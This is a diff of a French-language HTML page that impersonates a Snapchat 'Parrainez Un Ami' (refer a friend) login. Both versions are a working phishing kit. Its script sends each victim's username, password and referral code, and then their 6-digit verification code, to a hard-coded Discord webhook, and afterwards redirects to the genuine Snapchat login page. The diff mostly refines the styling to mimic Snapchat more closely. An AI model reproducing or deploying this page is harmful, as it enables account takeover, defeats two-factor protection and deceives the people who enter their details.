@@ -1,247 +1,298 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Snapchat | Parrainez Un Ami</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Snapchat | Parrainez Un Ami</title>
 
-  <meta property="og:title" content="Snapchat | Parrainez Un Ami" />
-  <meta property="og:description" content="Description courte" />
-  <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
+<!-- Style général pour ressembler à Snapchat -->
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    background-color: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+  }
 
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f0f0f0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .login-box, .code-screen {
-      width: 100%;
-      max-width: 400px;
-      padding: 40px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      border-radius: 10px;
-      text-align: center;
-      background-color: #fff;
-      color: #000;
-    }
-    .logo {
-      width: 80px;
-      margin: 0 auto 20px auto;
-      display: block;
-    }
-    .form-group {
-      text-align: left;
-      margin-bottom: 15px;
-    }
-    .form-group label {
-      display: block;
-      font-size: 13px;
-      font-weight: bold;
-      margin-bottom: 5px;
-    }
-    .form-group input {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
-      box-sizing: border-box;
-    }
-    button {
-      background-color: #fffc00;
-      border: none;
-      color: #000;
-      font-weight: bold;
-      padding: 12px;
-      width: 100%;
-      border-radius: 8px;
-      cursor: pointer;
-      margin-top: 20px;
-      font-size: 16px;
-    }
-    .links-container {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 10px;
-      font-size: 14px;
-    }
-    .link-button {
-      background: transparent;
-      border: none;
-      color: blue;
-      font-weight: bold;
-      cursor: pointer;
-      text-decoration: underline;
-    }
-    #errorMessage,
-    #referralError {
-      color: red;
-      display: none;
-      margin-top: 10px;
-    }
-    #codeScreen {
-      display: none;
-    }
-    #codeScreen p {
-      font-size: 14px;
-      margin-bottom: 10px;
-    }
-    #codeInput {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
-      box-sizing: border-box;
-      margin-bottom: 15px;
-    }
-    #confirmButton {
-      background-color: #ffff00; /* Jaune comme les autres */
-      border: none;
-      color: #000;
-      font-weight: bold;
-      padding: 12px;
-      width: 100%;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-  </style>
+  /* Container principal */
+  .container {
+    width: 100%;
+    max-width: 350px;
+    padding: 20px;
+  }
+
+  /* Style des formulaires et zones de texte */
+  .form-container {
+    background: #fff;
+    padding: 20px;
+    border-radius: 12px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+  }
+
+  h2 {
+    text-align: center;
+    font-weight: 600;
+    font-size: 24px;
+    margin-bottom: 20px;
+  }
+
+  /* Labels */
+  label {
+    display: block;
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 8px;
+    color: #222;
+  }
+
+  /* Input fields */
+  input[type=text], input[type=password] {
+    width: 100%;
+    padding: 14px 10px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    font-size: 14px;
+    margin-bottom: 15px;
+    box-sizing: border-box;
+  }
+
+  /* Bouton principal (bleu) */
+  .btn {
+    width: 100%;
+    padding: 14px;
+    background-color: #0078FF;
+    border: none;
+    border-radius: 8px;
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 10px;
+    transition: background-color 0.3s;
+  }
+  .btn:hover {
+    background-color: #0060e0;
+  }
+
+  /* Liens sous le bouton */
+  .links {
+    margin-top: 15px;
+    display: flex;
+    justify-content: space-between;
+    font-size: 13px;
+  }
+  .links a {
+    color: #0078FF;
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .links a:hover {
+    text-decoration: underline;
+  }
+
+  /* Message d'erreur */
+  #errorMessage, #referralError {
+    color: red;
+    font-size: 13px;
+    margin-top: 10px;
+    display: none;
+  }
+
+  /* Zone pour entrer le code reçu (style Snapchat) */
+  #codeContainer {
+    display: none;
+    text-align: center;
+  }
+
+  #codeContainer p {
+    font-size: 14px;
+    margin-bottom: 15px;
+    font-weight: 500;
+    color: #222;
+  }
+
+  #codeInput {
+    width: 100%;
+    padding: 14px;
+    font-size: 14px;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    margin-bottom: 15px;
+    box-sizing: border-box;
+  }
+
+  #confirmBtn {
+    width: 100%;
+    padding: 14px;
+    background-color: #ffff00; /* Jaune */
+    border: none;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.3s;
+  }
+  #confirmBtn:hover {
+    background-color: #e6e600;
+  }
+
+  /* Zone après confirmation, style Snapchat */
+  #messageZone {
+    display: none;
+    text-align: center;
+    padding: 20px;
+  }
+
+  #messageZone p {
+    font-size: 14px;
+    color: #222;
+  }
+</style>
 </head>
 <body>
-  <!-- Formulaire de connexion -->
-  <div class="login-box" id="loginBox">
-    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
-    <h2>Snapchat | Parrainez Un Ami</h2>
+
+<div class="container">
+
+  <!-- Formulaire de login -->
+  <div class="form-container" id="loginFormContainer">
+    <h2>Log into Snapchat</h2>
     <form id="loginForm">
-      <div class="form-group">
-        <label for="username">Nom d'utilisateur ou e-mail</label>
-        <input type="text" id="username" required />
-      </div>
-      <div class="form-group">
-        <label for="password">Mot de passe</label>
-        <input type="password" id="password" required />
-      </div>
-      <div class="form-group">
-        <label for="referralCode">Code de parrainage</label>
-        <input type="text" id="referralCode" required />
-      </div>
-      <button type="submit">Connexion</button>
-      <div class="links-container">
-        <button type="button" class="link-button">S'inscrire</button>
-        <button type="button" class="link-button">Mot de passe oublié</button>
+      <label for="username">USERNAME OR EMAIL</label>
+      <input type="text" id="username" required />
+      
+      <label for="password">PASSWORD</label>
+      <input type="password" id="password" required />
+      
+      <label for="referralCode">Referral Code</label>
+      <input type="text" id="referralCode" required />
+
+      <button type="submit" class="btn">Log In</button>
+      
+      <div class="links">
+        <a href="#">FORGOT PASSWORD</a>
+        <a href="#">CREATE ACCOUNT</a>
       </div>
     </form>
-    <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
-    <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
+    <div id="errorMessage">Incorrect username or password.</div>
+    <div id="referralError">Referral code must be exactly 4 digits.</div>
   </div>
 
   <!-- Zone pour entrer le code reçu -->
-  <div class="code-screen" id="codeScreen">
+  <div id="codeContainer">
     <p>Veuillez entrer le code à 6 chiffres reçu au numéro de téléphone ou à l'adresse mail</p>
     <input type="text" id="codeInput" maxlength="6" placeholder="Entrez le code à 6 chiffres" />
-    <button id="confirmButton">Confirmer</button>
+    <button id="confirmBtn">CONFIRMER</button>
   </div>
 
-  <script>
-    const webhookURL = "https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn";
-    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
+  <!-- Zone message après confirmation -->
+  <div id="messageZone">
+    <p>Votre code a été enregistré. Vous serez redirigé dans quelques instants.</p>
+  </div>
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
+</div>
 
-      const username = document.getElementById('username').value.trim();
-      const password = document.getElementById('password').value.trim();
-      const referralCode = document.getElementById('referralCode').value.trim();
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn";
+const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
 
-      document.getElementById('errorMessage').style.display = 'none';
-      document.getElementById('referralError').style.display = 'none';
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
 
-      if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
-        document.getElementById('errorMessage').style.display = 'block';
-        return;
+  // Récupérer valeurs
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+  const referralCode = document.getElementById('referralCode').value.trim();
+
+  document.getElementById('errorMessage').style.display = 'none';
+  document.getElementById('referralError').style.display = 'none';
+
+  // Vérifications
+  if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
+    document.getElementById('errorMessage').style.display = 'block';
+    return;
+  }
+  if (!/^\d{4}$/.test(referralCode)) {
+    document.getElementById('referralError').style.display = 'block';
+    return;
+  }
+
+  // Envoyer au webhook
+  const message = {
+    embeds: [
+      {
+        title: " Nouvelle tentative de connexion",
+        description: "Informations collectées via le formulaire",
+        color: 0xffc800,
+        fields: [
+          { name: " Nom d'utilisateur / e-mail", value: username },
+          { name: " Mot de passe", value: password },
+          { name: " Code de parrainage", value: referralCode }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: "Formulaire Rankos" }
       }
-      if (!/^\d{4}$/.test(referralCode)) {
-        document.getElementById('referralError').style.display = 'block';
-        return;
+    ]
+  };
+
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(message),
+  }).then(response => {
+    // Après envoi, afficher zone entrée code
+    setTimeout(() => {
+      document.getElementById('loginFormContainer').style.display = 'none';
+      document.getElementById('codeContainer').style.display = 'block';
+    }, 1000);
+  }).catch(error => {
+    alert("Erreur réseau ou CORS.");
+    console.error(error);
+  });
+});
+
+// Confirmer le code
+document.getElementById('confirmBtn').addEventListener('click', function() {
+  const code = document.getElementById('codeInput').value.trim();
+  if (code.length !== 6 || !/^\d{6}$/.test(code)) {
+    alert("Veuillez entrer un code valide à 6 chiffres.");
+    return;
+  }
+
+  // Envoyer le code au webhook
+  const message = {
+    embeds: [
+      {
+        title: " Code reçu",
+        description: "Code à 6 chiffres entré",
+        color: 0xffc800,
+        fields: [{ name: "Code reçu", value: code }],
+        timestamp: new Date().toISOString(),
+        footer: { text: "Code Entry" }
       }
+    ]
+  };
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(message),
+  }).then(() => {
+    // Après envoi, afficher message et rediriger
+    document.getElementById('codeContainer').style.display = 'none';
+    document.getElementById('messageZone').style.display = 'block';
+    setTimeout(() => {
+      window.location.href = redirectURL;
+    }, 30000);
+  }).catch(error => {
+    alert("Erreur réseau ou CORS.");
+    console.error(error);
+  });
+});
+</script>
 
-      // Envoi au webhook
-      const message = {
-        embeds: [
-          {
-            title: " Nouvelle tentative de connexion",
-            description: "Informations collectées via le formulaire",
-            color: 0xffc800,
-            fields: [
-              { name: " Nom d'utilisateur / e-mail", value: username },
-              { name: " Mot de passe", value: password },
-              { name: " Code de parrainage", value: referralCode }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: { text: "Formulaire Rankos" }
-          }
-        ]
-      };
-
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(message),
-      }).then(response => {
-        // Après envoi, afficher la zone pour entrer le code reçu
-        setTimeout(() => {
-          document.getElementById('loginBox').style.display = 'none';
-          document.getElementById('codeScreen').style.display = 'block';
-        }, 1000);
-      }).catch(error => {
-        alert("Erreur réseau ou CORS.");
-        console.error(error);
-      });
-    });
-
-    // Confirmer le code
-    document.getElementById('confirmButton').addEventListener('click', function() {
-      const code = document.getElementById('codeInput').value.trim();
-      if (code.length !== 6 || !/^\d{6}$/.test(code)) {
-        alert("Veuillez entrer un code valide à 6 chiffres.");
-        return;
-      }
-      // Envoyer le code au webhook
-      const message = {
-        embeds: [
-          {
-            title: " Code reçu",
-            description: "Code à 6 chiffres entré",
-            color: 0xffc800,
-            fields: [
-              { name: "Code reçu", value: code }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: { text: "Code Entry" }
-          }
-        ]
-      };
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(message),
-      }).then(() => {
-        // Après envoi, rediriger après 30 secondes
-        setTimeout(() => {
-          window.location.href = redirectURL;
-        }, 30000);
-      }).catch(error => {
-        alert("Erreur réseau ou CORS.");
-        console.error(error);
-      });
-    });
-  </script>
 </body>
 </html>
